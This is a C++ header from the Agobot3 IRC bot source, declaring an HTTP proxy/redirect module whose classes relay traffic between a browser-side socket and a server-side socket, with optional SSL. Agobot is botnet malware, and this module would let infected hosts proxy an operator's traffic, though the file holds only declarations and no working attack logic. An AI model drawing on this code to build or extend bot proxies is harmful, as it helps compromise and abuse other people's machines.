/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __REDIR_HTTP_H__
#define __REDIR_HTTP_H__

#include "cstring.h"
#include "redirect.h"
#include "utility.h"
#include "ssllib.h"

class CRedirectHTTP;
class CRedirectHTTP_Thread;

class CRedirectHTTP_Thread : public CRedirectBase
{
public:
	CRedirectHTTP_Thread();
	virtual void StartRedirect();
	virtual ~CRedirectHTTP_Thread() throw() {
		if(m_sServerSocket!=SOCKET_ERROR) xClose(m_sServerSocket);
		if(m_sClientSocket!=SOCKET_ERROR) xClose(m_sClientSocket);
	}

	CRedirectHTTP				*m_pRedirHTTP;		// Pointer to the base

	CString						 m_sLastHost;		// The host of the last request, used to detect server switching
	int							 m_iLastPort;		// The port of the last request
	bool						 m_bKeepAlive;		// Keep the connection open till closing is specified
	int							 m_sClientSocket;	// This is connected to the browser
	int							 m_sServerSocket;	// This is connected to the server
};

class CRedirectHTTP : public CRedirectBase
{
public:
	CRedirectHTTP();
	virtual void StartRedirect();
	virtual ~CRedirectHTTP() throw() {
		if(m_sListenSocket!=SOCKET_ERROR) xClose(m_sListenSocket);
	}

	void HTTPProxy();

	bool						 m_bUseSSL;
	int							 m_sListenSocket;
};

#endif // __REDIR_HTTP_H__
